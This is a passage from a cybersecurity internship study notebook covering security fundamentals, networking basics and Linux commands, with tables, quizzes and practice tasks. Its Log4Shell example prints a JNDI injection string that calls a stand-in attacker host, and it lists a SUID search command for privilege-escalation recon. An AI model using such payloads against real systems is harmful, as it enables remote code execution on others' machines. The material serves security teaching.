# Cybersecurity Internship Master Notebook

---

## TABLE OF CONTENTS

- Module 1 — Cybersecurity Fundamentals
- Module 2 — Networking for Cybersecurity
- Module 3 — Linux for Hackers
- Module 4 — Ethical Hacking Basics
- Module 5 — Cybersecurity Tools
- Module 6 — Web Security
- Module 7 — Password & Authentication Security
- Module 8 — System Security
- Module 9 — Cloud & Modern Security
- Module 10 — Blue Team Basics
- Module 11 — Career & Internship Readiness
- 60-Day Study Roadmap
- Lab Setup Guide
- Cheat Sheets
- Resources & Platforms
- Master Interview Questions

---

# MODULE 1 — CYBERSECURITY FUNDAMENTALS

## What is Cybersecurity

**Definition**
Cybersecurity is the practice of protecting computers, networks, programs, and data from unauthorized access, damage, or attacks using a combination of people, processes, and technology.

**Key Explanation**
- Think of it like home security — locks, cameras, alarms protect your house; firewalls, encryption, and monitoring protect digital assets
- Cybersecurity is not just about hacking — it covers prevention, detection, response, and recovery
- Every organization that uses computers or the internet needs cybersecurity
- The field spans technical skills (hacking, coding) and non-technical (policy, compliance, risk)

**Important Points**
- Cybersecurity protects three things: **Confidentiality, Integrity, Availability** (CIA Triad)
- Three main categories of security: **People, Process, Technology**
- Cybersecurity ≠ IT support; it is a specialized discipline focused on adversarial threats
- Global cybercrime costs are projected to exceed $10 trillion annually by 2025

**Example**
When you log into your bank, HTTPS encrypts your data, a firewall blocks unauthorized access, and an IDS monitors for suspicious activity. That combination is cybersecurity in action.

**Quick Revision**
- Cybersecurity = protecting digital assets from unauthorized access/damage
- Key pillars: People, Process, Technology
- Applies to individuals, businesses, governments, and critical infrastructure
- Both offensive (hacking) and defensive (protection) roles exist


## CIA Triad

**Definition**
The CIA Triad is the foundational model of information security consisting of **Confidentiality**, **Integrity**, and **Availability** — the three core goals every security system must achieve.

**Key Explanation**
- **Confidentiality** — Only authorized people can access data (e.g., your password is visible only to you)
- **Integrity** — Data is accurate and unmodified (e.g., a bank transfer amount isn't changed in transit)
- **Availability** — Systems and data are accessible when needed (e.g., a hospital's patient records are always online)
- Every security control, policy, and tool maps to one or more of these three pillars

**Important Points**

| Property | Goal | Threat | Control |
|---|---|---|---|
| Confidentiality | Prevent unauthorized access | Eavesdropping, data theft | Encryption, access control |
| Integrity | Prevent unauthorized modification | Man-in-the-Middle, tampering | Hashing, digital signatures |
| Availability | Ensure system uptime | DDoS, ransomware | Backups, redundancy, DDoS protection |

- Sometimes extended to **CIAA** (adding **Authenticity**) or **Parkerian Hexad**
- Real-world example of all three failing: A ransomware attack encrypts files (breaks Availability), steals data (breaks Confidentiality), and corrupts backups (breaks Integrity)

**Example**
A hospital system must keep patient records confidential (only doctors see them), ensure records are accurate (integrity), and be always accessible in emergencies (availability). Failing any one of these can cost lives.

**Quick Revision**
- CIA = Confidentiality, Integrity, Availability
- Confidentiality → Encryption, Access Control
- Integrity → Hashing (MD5, SHA), Digital Signatures
- Availability → Redundancy, Load balancers, Backups
- Attack breaking Availability = DDoS; breaking Confidentiality = Data breach


## Threats, Vulnerabilities, and Exploits

**Definition**
- **Threat** — Any potential danger to an information system (e.g., a hacker, a flood, malware)
- **Vulnerability** — A weakness in a system that can be exploited (e.g., unpatched software, weak password)
- **Exploit** — The actual method or code used to take advantage of a vulnerability

**Key Explanation**
- Think of it as: a threat is the storm, vulnerability is a crack in the wall, exploit is the water that pours through
- Risk = Threat × Vulnerability (if either is zero, risk is zero)
- Patch management (fixing vulnerabilities) is the most impactful security activity organizations can do
- CVE (Common Vulnerabilities and Exposures) is the global database of known vulnerabilities

**Important Points**
- **Attack Vector** — The path an attacker uses to reach a target (network, email, USB)
- **Attack Surface** — All possible points where an attacker could enter a system
- **Zero-Day** — A vulnerability that is unknown to the vendor; no patch exists yet
- **CVE Score** — CVSS (Common Vulnerability Scoring System) rates vulnerabilities 0–10
  - 0–3.9: Low | 4–6.9: Medium | 7–8.9: High | 9–10: Critical

**Example**
Log4Shell (CVE-2021-44228): A vulnerability in Apache Log4j (a Java logging library) allowed remote code execution. The threat was malicious actors, the vulnerability was in the Log4j code, and the exploit was injecting a malicious string like `${jndi:ldap://attacker.com/a}`.

**Quick Revision**
- Threat = potential danger | Vulnerability = weakness | Exploit = the weapon
- Zero-day = no patch exists
- CVE database: cve.mitre.org
- Reduce risk by patching vulnerabilities and reducing attack surface


## Types of Hackers

**Definition**
Hackers are categorized by their intent and authorization level, commonly using a "hat" color system.

**Key Explanation**

| Hacker Type | Intent | Authorization | Example |
|---|---|---|---|
| **White Hat** | Ethical, improve security | Yes (legal) | Penetration testers, bug bounty hunters |
| **Black Hat** | Malicious, financial/political gain | No (illegal) | Cybercriminals, state-sponsored hackers |
| **Grey Hat** | Mixed — finds flaws without permission, may disclose | Partial | Hacker who finds a bug and notifies vendor without permission first |
| **Script Kiddie** | No skill; uses others' tools | No | Downloads hacking tools and runs them without understanding |
| **Hacktivists** | Ideological/political motivation | No | Anonymous, attacking government sites |
| **State-Sponsored** | Nation-state espionage/warfare | Varies | APT28 (Russia), Lazarus Group (North Korea) |
| **Insider Threat** | Disgruntled employee or planted mole | Yes (abused) | Employee stealing data before leaving |

**Important Points**
- **APT** (Advanced Persistent Threat) = sophisticated, long-term attackers, usually state-sponsored
- The internship role (ethical hacker / pentester) = White Hat
- Bug bounty programs pay White Hats to find vulnerabilities legally
- Insider threats are the most costly and hardest to detect

**Quick Revision**
- White = ethical, authorized | Black = criminal, unauthorized | Grey = middle ground
- Script Kiddie = no skills, just tools
- APT = nation-state level threat actors
- Your role = White Hat (always)


## Malware Types

**Definition**
Malware (malicious software) is any program designed to disrupt, damage, or gain unauthorized access to computer systems.

**Key Explanation**
- Malware is the most common tool attackers use after initial access
- It can spread via email attachments, malicious websites, USB drives, or software vulnerabilities
- Modern malware is often multi-stage: dropper → payload → persistence

**Important Points**

| Type | What it Does | Example |
|---|---|---|
| **Virus** | Self-replicates by attaching to legitimate files | ILOVEYOU |
| **Worm** | Self-replicates across networks without host file | WannaCry |
| **Trojan** | Disguises as legitimate software | Remote Access Trojans (RATs) |
| **Ransomware** | Encrypts files, demands payment | LockBit, REvil |
| **Spyware** | Secretly monitors user activity | Keyloggers |
| **Adware** | Displays unwanted ads, may track behavior | Superfish |
| **Rootkit** | Hides its presence deep in the OS | Stuxnet (partially) |
| **Botnet** | Network of infected machines controlled remotely | Mirai (IoT botnet) |
| **Logic Bomb** | Triggers malicious code on a specific condition | Time-based activation |
| **Fileless Malware** | Lives in RAM, no files on disk | PowerShell-based attacks |

- **C2 (Command and Control)** server = attacker's server that communicates with malware
- **Payload** = the actual malicious action the malware performs
- **Dropper** = a program whose only job is to install the actual malware

**Example**
WannaCry (2017) was a ransomware worm. It exploited the EternalBlue vulnerability in Windows SMB, spread itself across networks like a worm, then encrypted files and demanded Bitcoin. It hit 200,000+ systems in 150 countries.

**Quick Revision**
- Virus = attaches to files | Worm = self-spreads over network
- Ransomware = most financially damaging malware today
- Fileless = hardest to detect (no disk footprint)
- Botnet = army of compromised machines


## Phishing & Social Engineering

**Definition**
Social engineering is the psychological manipulation of people into performing actions or divulging confidential information. Phishing is the most common form — a fraudulent attempt to obtain sensitive data by impersonating a trusted entity.

**Key Explanation**
- Attackers exploit human psychology, not technical vulnerabilities
- Common emotions exploited: urgency, fear, curiosity, greed, authority
- Technical defenses mean nothing if a user hands over credentials voluntarily
- Most breaches start with phishing — it's the #1 initial access vector

**Important Points**

| Type | Description |
|---|---|
| **Phishing** | Bulk email impersonating trusted brands |
| **Spear Phishing** | Targeted phishing at a specific individual |
| **Whaling** | Spear phishing targeting executives (CEO, CFO) |
| **Smishing** | Phishing via SMS |
| **Vishing** | Phishing via phone/voice call |
| **Pretexting** | Creating a fake scenario to extract info |
| **Baiting** | Leaving a USB drive labeled "Salary Data" |
| **Tailgating** | Physically following someone into a secure area |
| **Quid Pro Quo** | Offering something in exchange for information |

- Red flags of phishing: Urgency, misspelled domains (`paypa1.com`), unexpected attachments, requests for credentials
- **DMARC, DKIM, SPF** = email authentication protocols that reduce email spoofing

**Example**
A finance employee receives an email from "CEO@company-corp.com" (real domain: company.com) saying: "Wire $50,000 to this account immediately — it's urgent and confidential." This is whaling/Business Email Compromise (BEC).

**Quick Revision**
- Phishing = fake emails | Smishing = fake SMS | Vishing = fake calls
- Spear phishing = targeted | Whaling = targeting executives
- Humans are the weakest link in security
- Always verify out-of-band (call the person directly to confirm)


## Cyber Attack Basics

**Definition**
A cyber attack is a deliberate attempt by an individual or organization to breach the information system of another organization or individual.

**Key Explanation**
- Attacks follow a lifecycle/methodology (covered in Module 4)
- Not all attacks are about stealing data — some aim to disrupt, spy, or destroy
- Attacks can be opportunistic (automated scans) or targeted (nation-state)

**Important Points**

| Attack Type | Description |
|---|---|
| **DoS/DDoS** | Flooding a system to make it unavailable |
| **Man-in-the-Middle (MitM)** | Intercepting communication between two parties |
| **SQL Injection** | Injecting SQL code into a database query |
| **Cross-Site Scripting (XSS)** | Injecting scripts into web pages viewed by users |
| **Brute Force** | Trying all possible passwords |
| **Credential Stuffing** | Using leaked username/password lists on other sites |
| **Supply Chain Attack** | Compromising software before it reaches the target |
| **DNS Spoofing/Cache Poisoning** | Redirecting users to malicious sites |
| **Replay Attack** | Capturing and retransmitting valid data transmissions |
| **Zero-Day Exploit** | Exploiting an unknown, unpatched vulnerability |

- **Supply chain attack example:** SolarWinds (2020) — attackers compromised SolarWinds' software update, which then infected 18,000+ organizations including US government agencies
- **DDoS mitigation:** Cloudflare, Akamai, rate limiting

**Quick Revision**
- DDoS = volumetric attack on availability
- MitM = intercept and potentially modify traffic
- SQLi and XSS = top web application attacks
- Supply chain = compromise the vendor, reach thousands of targets


## Cybersecurity Domains

**Definition**
Cybersecurity is divided into specialized domains, each covering a distinct area of security practice.

**Key Explanation**
- Understanding domains helps you identify which career path fits you
- Most professionals specialize in 1–2 domains but must have awareness of all
- Domains have different tools, skills, and certifications

**Important Points**

| Domain | Focus | Key Tools/Skills |
|---|---|---|
| **Network Security** | Protecting network infrastructure | Firewalls, IDS/IPS, Wireshark |
| **Application Security (AppSec)** | Securing software/web apps | Burp Suite, SAST, DAST |
| **Cloud Security** | Securing cloud environments | AWS IAM, Azure Security Center |
| **Identity & Access Management (IAM)** | Managing who accesses what | Active Directory, MFA, SSO |
| **Incident Response (IR)** | Responding to breaches | SIEM, forensics tools |
| **Threat Intelligence** | Gathering intel on threats | MITRE ATT&CK, VirusTotal |
| **Red Team** | Offensive security, simulated attacks | Metasploit, Cobalt Strike |
| **Blue Team** | Defensive security, monitoring | SIEM, EDR, SOAR |
| **GRC** | Governance, Risk, Compliance | ISO 27001, GDPR, NIST |
| **Digital Forensics** | Investigating cyber crimes | Autopsy, FTK, Volatility |
| **OT/ICS Security** | Industrial control systems | SCADA, Modbus security |

**Quick Revision**
- Red Team = attackers (offensive) | Blue Team = defenders (defensive)
- Purple Team = Red + Blue working together
- GRC = legal/compliance side of security
- Your internship may touch Network Security, AppSec, and Blue Team basics


## MODULE 1 — MINI ASSIGNMENTS & REVISION

**Practical Tasks**
1. Search for 3 recent data breaches on https://haveibeenpwned.com — identify the attack type for each
2. Identify 5 phishing red flags in a sample email (Google "phishing email examples")
3. Look up CVE-2021-44228 (Log4Shell) on cve.mitre.org — note its CVSS score and impact
4. Create a CIA Triad diagram for a hospital system — what controls ensure each property?
5. Find 3 real malware samples on MalwareBazaar (bazaar.abuse.ch) — identify their type

**MCQs**
1. Which component of the CIA Triad does a DDoS attack primarily violate?
   - a) Confidentiality  b) Integrity  **c) Availability**  d) Authentication

2. A vulnerability with no available patch is called a:
   - a) CVE  b) CVSS  **c) Zero-day**  d) Logic bomb

3. Phishing targeting a specific high-level executive is called:
   - a) Spear phishing  b) Smishing  **c) Whaling**  d) Vishing

4. Which type of malware self-replicates across networks without needing a host file?
   - a) Virus  b) Trojan  **c) Worm**  d) Rootkit

5. Which hacker type finds vulnerabilities ethically with permission?
   - **a) White Hat**  b) Black Hat  c) Grey Hat  d) Script Kiddie

**Module 1 Revision Notes**
- CIA Triad is the foundation of all security decisions
- Threat ≠ Vulnerability ≠ Exploit — know the difference
- Ransomware = most damaging malware type currently
- Phishing = #1 initial access vector in real-world breaches
- Always think: What is the attacker's goal? (Confidentiality? Availability? Integrity?)

---

# MODULE 2 — NETWORKING FOR CYBERSECURITY

## OSI Model

**Definition**
The OSI (Open Systems Interconnection) Model is a conceptual framework with 7 layers that standardizes how different network systems communicate with each other.

**Key Explanation**
- Every network communication can be broken down into these 7 layers
- Each layer has specific responsibilities and communicates with layers above and below
- Security professionals use OSI to identify where an attack or vulnerability exists
- Think of it as a process of "wrapping" data in envelopes as it travels

**Important Points**

```
OSI MODEL — TOP TO BOTTOM
+--------+---------------------+----------------------------+------------------+
| Layer  | Name                | Function                   | Protocol/Device  |
+--------+---------------------+----------------------------+------------------+
|   7    | Application         | User interface, HTTP, DNS  | HTTP, FTP, DNS   |
|   6    | Presentation        | Encoding, encryption, SSL  | SSL/TLS, JPEG    |
|   5    | Session             | Manage sessions/connections| NetBIOS, RPC     |
|   4    | Transport           | End-to-end comm, ports     | TCP, UDP         |
|   3    | Network             | Routing, IP addressing     | IP, ICMP, Router |
|   2    | Data Link           | MAC addressing, frames     | Ethernet, Switch |
|   1    | Physical            | Cables, signals, bits      | Hubs, cables     |
+--------+---------------------+----------------------------+------------------+
```

- **Mnemonic (top to bottom):** "All People Seem To Need Data Processing"
- **Mnemonic (bottom to top):** "Please Do Not Throw Sausage Pizza Away"
- Attacks mapped to OSI:
  - Layer 3: IP spoofing, routing attacks
  - Layer 4: SYN flood (TCP)
  - Layer 7: SQL injection, XSS, HTTP attacks

**Example**
When you visit a website: Your browser (Layer 7) creates an HTTP request → TLS encrypts it (Layer 6) → TCP breaks it into segments (Layer 4) → IP routes it (Layer 3) → Ethernet frames it (Layer 2) → Physical cables transmit bits (Layer 1).

**Quick Revision**
- 7 layers: Physical, Data Link, Network, Transport, Session, Presentation, Application
- Layer 4 = TCP/UDP | Layer 3 = IP | Layer 7 = HTTP/DNS
- DDoS attacks often target Layer 3-4; application attacks target Layer 7
- Wireshark captures at Layer 2 and above


## TCP/IP

**Definition**
TCP/IP (Transmission Control Protocol/Internet Protocol) is the fundamental communication protocol suite of the internet, defining how data is packaged, addressed, transmitted, and received.

**Key Explanation**
- TCP/IP has 4 layers (a simplified version of OSI): Network Access, Internet, Transport, Application
- **TCP** = connection-oriented, reliable, ordered delivery (uses handshake)
- **UDP** = connectionless, faster, no guarantee of delivery

**Important Points**

**TCP Three-Way Handshake:**
```
Client                    Server
  |--- SYN ----------------->|    "I want to connect"
  |<-- SYN-ACK --------------|    "Okay, I acknowledge"
  |--- ACK ----------------->|    "Connection established"
         [Data Transfer]
  |--- FIN ----------------->|    "I want to disconnect"
  |<-- FIN-ACK --------------|    "Closing..."
```

| Feature | TCP | UDP |
|---|---|---|
| Connection | Connection-oriented | Connectionless |
| Reliability | Guaranteed delivery | No guarantee |
| Speed | Slower (overhead) | Faster |
| Order | Ordered | Not ordered |
| Use case | HTTP, email, SSH | DNS, video streaming, gaming |

- **SYN Flood attack:** Attacker sends many SYN packets without completing the handshake → fills server's connection table → DoS
- **TCP flags:** SYN, ACK, FIN, RST, PSH, URG

**Quick Revision**
- TCP = reliable, ordered, slower | UDP = fast, unreliable
- Three-way handshake: SYN → SYN-ACK → ACK
- SYN flood = DoS attack exploiting TCP handshake
- TCP is used for HTTP, HTTPS, SSH | UDP for DNS, VoIP


## IP Addressing

**Definition**
An IP (Internet Protocol) address is a unique numerical label assigned to each device on a network, used to identify and locate it for communication.

**Key Explanation**
- **IPv4**: 32-bit address, written as 4 octets (e.g., 192.168.1.1)
- **IPv6**: 128-bit address, written in hex (e.g., 2001:0db8::1)
- IPv4 is still dominant but IPv6 is growing due to address exhaustion

**Important Points**
- **Private IP ranges (RFC 1918):**
  - 10.0.0.0 – 10.255.255.255 (Class A)
  - 172.16.0.0 – 172.31.255.255 (Class B)
  - 192.168.0.0 – 192.168.255.255 (Class C)
- **Public IP**: Assigned by ISP, routable on the internet
- **Loopback**: 127.0.0.1 (your own machine, `localhost`)
- **Broadcast**: 255.255.255.255 (all devices on a network)
- **NAT** (Network Address Translation): Allows multiple private IPs to share one public IP
- **DHCP**: Automatically assigns IP addresses to devices on a network
- **Static IP**: Manually configured, used for servers

**Subnetting Basics:**
```
IP:      192.168.1.100
Mask:    255.255.255.0  (/24)
Network: 192.168.1.0
Hosts:   192.168.1.1 – 192.168.1.254 (254 hosts)
Broadcast: 192.168.1.255
```

**Quick Revision**
- IPv4 = 32-bit | IPv6 = 128-bit
- 192.168.x.x and 10.x.x.x are private (not internet-routable)
- 127.0.0.1 = loopback (yourself)
- /24 subnet = 254 usable hosts
- NAT = maps private IPs to one public IP


## DNS

**Definition**
DNS (Domain Name System) is the internet's "phone book" — it translates human-readable domain names (google.com) into IP addresses (142.250.80.46) that computers use to communicate.

**Key Explanation**
- Without DNS, you'd need to memorize IP addresses for every website
- DNS is a distributed, hierarchical database
- DNS resolution process (simplified):
  1. You type `google.com`
  2. Your browser checks local cache
  3. Asks your Recursive Resolver (usually your ISP)
  4. Resolver asks Root DNS Server (who handles `.com`?)
  5. Root refers to TLD server (`.com` servers)
  6. TLD refers to Google's Authoritative DNS server
  7. Authoritative server returns the IP
  8. Browser connects to that IP

**Important Points**

| Record Type | Purpose | Example |
|---|---|---|
| **A** | Maps domain to IPv4 | google.com → 142.250.80.46 |
| **AAAA** | Maps domain to IPv6 | google.com → 2607:f8b0:... |
| **MX** | Mail server for domain | google.com → aspmx.l.google.com |
| **CNAME** | Alias for another domain | www → example.com |
| **TXT** | Text records (SPF, DKIM) | Used for email authentication |
| **PTR** | Reverse lookup (IP → domain) | Used in reverse DNS |
| **NS** | Name server record | Which DNS server handles this domain |

- **DNS Cache Poisoning**: Attacker injects false DNS records → users redirected to malicious sites
- **DNS over HTTPS (DoH)**: Encrypts DNS queries (privacy)
- Port 53 = DNS

**Quick Revision**
- DNS = domain → IP translation
- Port 53 (UDP for queries, TCP for zone transfers)
- A record = IPv4 | AAAA = IPv6 | MX = mail
- DNS poisoning = redirect users to attacker's server
- `nslookup` and `dig` are DNS query tools


## HTTP vs HTTPS

**Definition**
HTTP (HyperText Transfer Protocol) is the protocol for transferring web data. HTTPS is HTTP secured with TLS/SSL encryption.

**Key Explanation**
- HTTP sends data in plaintext — anyone intercepting the traffic can read it
- HTTPS encrypts data using TLS — intercepted traffic is unreadable
- The difference is critical for login pages, banking, and any sensitive data

**Important Points**

| Feature | HTTP | HTTPS |
|---|---|---|
| Port | 80 | 443 |
| Encryption | None | TLS/SSL |
| Security | Vulnerable to MitM | Encrypted |
| Certificate | None | X.509 SSL Certificate |
| Speed | Slightly faster | Minor overhead |

- **TLS Handshake**: Client and server negotiate encryption keys before data transfer
- **SSL Certificate**: Issued by Certificate Authority (CA) like Let's Encrypt, DigiCert
- **HSTS** (HTTP Strict Transport Security): Forces browsers to use HTTPS only
- HTTP methods: GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS
- Status codes:
  - 200 = OK | 301 = Redirect | 401 = Unauthorized | 403 = Forbidden | 404 = Not Found | 500 = Server Error

**Quick Revision**
- HTTP port 80 | HTTPS port 443
- HTTPS = HTTP + TLS encryption
- Always use HTTPS for any sensitive communication
- Look for padlock in browser = valid SSL certificate
- HTTP methods: GET (read), POST (create), PUT (update), DELETE (remove)


## Ports & Protocols

**Definition**
A port is a virtual endpoint on a networked device that identifies a specific process or service. Protocols are standardized rules for communication.

**Key Explanation**
- IP address = the building | Port = the specific apartment number
- Ports 0–1023 are "well-known" ports (reserved for standard services)
- Ports 1024–49151 are "registered" ports
- Ports 49152–65535 are "dynamic/ephemeral" ports

**Important Points**

| Port | Protocol | Service |
|---|---|---|
| 21 | TCP | FTP (File Transfer) |
| 22 | TCP | SSH (Secure Shell) |
| 23 | TCP | Telnet (insecure!) |
| 25 | TCP | SMTP (Email sending) |
| 53 | UDP/TCP | DNS |
| 67/68 | UDP | DHCP |
| 80 | TCP | HTTP |
| 110 | TCP | POP3 (Email retrieval) |
| 143 | TCP | IMAP (Email retrieval) |
| 443 | TCP | HTTPS |
| 445 | TCP | SMB (Windows file sharing) |
| 3389 | TCP | RDP (Remote Desktop) |
| 3306 | TCP | MySQL |
| 5432 | TCP | PostgreSQL |
| 8080 | TCP | HTTP Alternate |

- **SMB (port 445)** was exploited by WannaCry and EternalBlue
- **RDP (port 3389)** is frequently targeted for brute force attacks
- **Telnet (port 23)** sends data in plaintext — should never be used in production

**Quick Revision**
- SSH=22, HTTP=80, HTTPS=443, DNS=53, FTP=21, RDP=3389
- SMB port 445 = frequent attack target
- Telnet = insecure version of SSH (never use in production)
- Open ports = attack surface — close all unnecessary ports


## VPN

**Definition**
A VPN (Virtual Private Network) creates an encrypted tunnel between a device and a remote server, protecting data from interception and masking the user's IP address.

**Key Explanation**
- Encrypts all traffic between you and the VPN server
- Your real IP is replaced with the VPN server's IP
- Commonly used: corporate remote access, bypassing geo-restrictions, privacy on public WiFi
- Does NOT make you fully anonymous

**Important Points**
- **Types of VPN:**
  - **Site-to-Site VPN**: Connects two entire networks (e.g., two office locations)
  - **Remote Access VPN**: Individual user connects to a corporate network
  - **SSL/TLS VPN**: Uses browser-based access, no client needed
- **VPN Protocols:**
  - **OpenVPN** — Open source, highly secure
  - **WireGuard** — Modern, fast, lightweight
  - **IPSec/IKEv2** — Common in mobile VPNs
  - **PPTP** — Old, insecure, avoid
- **Split Tunneling**: Only route some traffic through VPN
- In penetration testing, always use a VPN when connecting to lab networks (TryHackMe uses this)

**Quick Revision**
- VPN = encrypted tunnel + IP masking
- Site-to-Site = office to office | Remote Access = user to office
- OpenVPN and WireGuard = most secure protocols
- PPTP = insecure, avoid
- VPN ≠ full anonymity


## Firewalls

**Definition**
A firewall is a network security device (hardware or software) that monitors and controls incoming and outgoing network traffic based on predefined security rules.

**Key Explanation**
- Acts as a gatekeeper between trusted internal networks and untrusted external networks
- Rules define what traffic is allowed or denied based on IP, port, protocol, direction

**Important Points**

| Type | How it Works |
|---|---|
| **Packet Filter** | Checks IP, port, protocol in packet headers. Fast but basic. |
| **Stateful Inspection** | Tracks connection state; allows related packets. More intelligent. |
| **Application Layer (WAF)** | Inspects application data (HTTP content). Stops SQLi, XSS. |
| **Next-Gen Firewall (NGFW)** | Combines all above + deep packet inspection + IPS + identity awareness |

- **DMZ (Demilitarized Zone)**: A network segment between internal network and internet; web servers placed here
- **ACL (Access Control List)**: The ruleset in a firewall
- **IDS** (Intrusion Detection System): Detects attacks and alerts
- **IPS** (Intrusion Prevention System): Detects AND blocks attacks
- Common firewalls: pfSense (open source), Cisco ASA, Palo Alto, Fortinet

```
Internet → [Firewall] → [DMZ: Web/Mail Servers] → [Firewall] → Internal Network
```

**Quick Revision**
- Firewall = traffic gatekeeper based on rules
- Stateful > Packet filter (understands connections)
- WAF = web application firewall (stops SQLi, XSS)
- DMZ = exposed servers separated from internal network
- IDS = detects | IPS = detects + blocks


## Subnetting Basics

**Definition**
Subnetting is the process of dividing a larger IP network into smaller, more manageable sub-networks (subnets).

**Key Explanation**
- Improves security by isolating network segments
- Improves performance by reducing broadcast traffic
- CIDR notation: /24 means 24 bits for network, 8 bits for hosts

**Important Points**

| CIDR | Subnet Mask | Hosts Available |
|---|---|---|
| /24 | 255.255.255.0 | 254 |
| /25 | 255.255.255.128 | 126 |
| /26 | 255.255.255.192 | 62 |
| /27 | 255.255.255.224 | 30 |
| /28 | 255.255.255.240 | 14 |
| /30 | 255.255.255.252 | 2 |
| /32 | 255.255.255.255 | 1 (single host) |

- Formula: Hosts = 2^(32 - CIDR) - 2 (subtract network and broadcast addresses)
- /24 is the most common for home/small office networks
- Subnetting enables VLANs (Virtual LANs) for network segmentation

**Quick Revision**
- /24 = 254 hosts (most common)
- /32 = single host (used in firewall rules)
- More bits in mask = fewer hosts = smaller subnet
- Subnetting improves security through network segmentation


## Wireshark Introduction

**Definition**
Wireshark is an open-source network protocol analyzer (packet sniffer) that captures and interactively analyzes network traffic in real time.

**Key Explanation**
- Captures packets at the network interface level
- Can decode 100+ protocols (HTTP, DNS, TCP, etc.)
- Used in network troubleshooting, security analysis, malware analysis
- Essential tool for understanding what's happening on a network

**Important Points**
- **Installation:** `sudo apt install wireshark` (Linux) or download from wireshark.org
- **Key interface components:**
  - Packet List Pane (top)
  - Packet Details Pane (middle)
  - Packet Bytes Pane (bottom)
- **Common display filters:**
  - `http` — show only HTTP packets
  - `ip.addr == 192.168.1.1` — filter by IP
  - `tcp.port == 80` — filter by port
  - `dns` — show DNS traffic
  - `tcp.flags.syn == 1` — show SYN packets
  - `!(arp or dns)` — exclude ARP and DNS noise
- **Follow TCP Stream:** Right-click a packet → Follow → TCP Stream (see full conversation)
- **Export objects:** File → Export Objects → HTTP (extract downloaded files)

**Example Task**
Capture traffic on TryHackMe or your home network, filter for `http`, and look for credentials sent in plaintext. This demonstrates why HTTPS is critical.

**Quick Revision**
- Wireshark = packet capture and analysis tool
- Captures at Layer 2 (Data Link) and above
- Use display filters to reduce noise
- "Follow TCP Stream" reveals full conversations
- Can extract files from captured traffic


## MODULE 2 — MINI ASSIGNMENTS & REVISION

**Practical Tasks**
1. Run `ipconfig /all` (Windows) or `ip addr` (Linux) — identify your IP, subnet, gateway, DNS
2. Use `nslookup google.com` and `dig google.com` — compare outputs
3. Use `traceroute google.com` (Linux) or `tracert google.com` (Windows) — count hops
4. Open Wireshark, capture traffic while browsing — filter for `dns` and note what you see
5. Draw the OSI model from memory and map 5 protocols to their layers
6. Calculate: What is the host range for 192.168.10.0/27?

**MCQs**
1. Which OSI layer handles IP addressing?
   - a) Layer 2  **b) Layer 3**  c) Layer 4  d) Layer 7

2. TCP uses which port for SSH?
   - a) 21  **b) 22**  c) 23  d) 25

3. What does DNS port 53 primarily use?
   - a) TCP  **b) UDP** (for queries)  c) ICMP  d) HTTP

4. How many usable hosts does a /24 subnet provide?
   - a) 256  **b) 254**  c) 255  d) 252

5. Which protocol sends data in plaintext and should never be used in production?
   - a) SSH  b) SFTP  **c) Telnet**  d) HTTPS

---

# MODULE 3 — LINUX FOR HACKERS

## Linux Basics & Kali Linux

**Definition**
Linux is an open-source, Unix-like operating system. Kali Linux is a Debian-based distribution specifically designed for penetration testing and digital forensics, pre-loaded with 600+ security tools.

**Key Explanation**
- Most servers, network devices, and cloud infrastructure run Linux
- Security tools like Metasploit, Nmap, Wireshark are primarily Linux-native
- Kali Linux = the industry-standard OS for ethical hackers
- Everything in Linux is a file — understanding the file system is essential

**Important Points**

**Linux File System Hierarchy:**
```
/           Root of everything
├── /bin    Essential command binaries (ls, cp, mv)
├── /etc    System configuration files
├── /home   User home directories (/home/username)
├── /root   Root user's home directory
├── /var    Variable data (logs at /var/log)
├── /tmp    Temporary files (world-writable, attack target)
├── /usr    User programs and utilities
├── /proc   Virtual filesystem (process/kernel info)
├── /dev    Device files
└── /opt    Optional/third-party software
```

- Kali Linux download: kali.org (use the VM image for VirtualBox/VMware)
- Default Kali credentials: kali/kali (older versions: root/toor)
- Tools pre-installed: Nmap, Metasploit, Burp Suite, Wireshark, Hydra, SQLmap, etc.

**Quick Revision**
- /etc = config files | /var/log = logs | /tmp = temp (often writable)
- Kali = pentest-focused Linux distro
- Everything is a file in Linux (including hardware devices)
- Root user = full system access (equivalent to Windows Administrator)


## File Permissions

**Definition**
Linux file permissions control who can read, write, and execute files and directories, using a user-group-other permission model.

**Key Explanation**
- Every file has an owner (user), a group, and permissions for others
- Permissions: **r** (read=4), **w** (write=2), **x** (execute=1)
- Three permission sets: **Owner | Group | Others**

**Important Points**

```
Example: -rwxr-xr--
         |   |   |
         |   |   +-- Others: r-- = 4 (read only)
         |   +------ Group:  r-x = 5 (read + execute)
         +---------- Owner:  rwx = 7 (read + write + execute)
         
First character: - = file, d = directory, l = symbolic link
```

| Permission | Symbol | Octal |
|---|---|---|
| Read | r | 4 |
| Write | w | 2 |
| Execute | x | 1 |
| No permission | - | 0 |

**Common permission combinations:**
- `chmod 777` = rwxrwxrwx (everyone has full access — dangerous)
- `chmod 755` = rwxr-xr-x (owner full, group/others read+execute — common for executables)
- `chmod 644` = rw-r--r-- (owner read+write, others read — common for files)
- `chmod 600` = rw------- (owner only — used for SSH private keys)

**Special permissions:**
- **SUID (4xxx):** Runs file as owner, not executor (e.g., `passwd` command)
- **SGID (2xxx):** Runs as group owner
- **Sticky bit (1xxx):** Only file owner can delete (used on /tmp)

**Commands:**
```bash
ls -la                      # List files with permissions
chmod 755 script.sh         # Set permissions numerically
chmod +x script.sh          # Add execute permission
chown user:group file.txt   # Change owner and group
chgrp groupname file.txt    # Change group only
find / -perm -4000 2>/dev/null  # Find SUID files (privesc recon)
```

**Quick Revision**
- r=4, w=2, x=1 | Owner/Group/Others
- 644 = standard file | 755 = standard executable | 600 = private key
- SUID bit = runs as file owner (privilege escalation risk)
- `chmod`, `chown` = key permission commands
- Find SUID files: `find / -perm -4000`


## Essential Terminal Commands

**Definition**
The terminal (command line interface) is the primary interface for interacting with Linux systems, essential for security professionals.

**Important Points**

**Navigation & File Management:**
```bash
pwd                     # Print working directory
ls -la                  # List all files with details
cd /path/to/dir         # Change directory
cd ..                   # Go up one level
cd ~                    # Go to home directory
mkdir directory_name    # Create directory
rmdir directory_name    # Remove empty directory
rm file.txt             # Remove file
rm -rf directory/       # Force remove directory (DANGEROUS)
cp source dest          # Copy file
mv source dest          # Move/rename file
touch file.txt          # Create empty file
cat file.txt            # Display file contents
less file.txt           # View file page by page
head -n 20 file.txt     # First 20 lines
tail -n 20 file.txt     # Last 20 lines
tail -f /var/log/syslog # Live follow log file
```

**Search & Filter:**
```bash
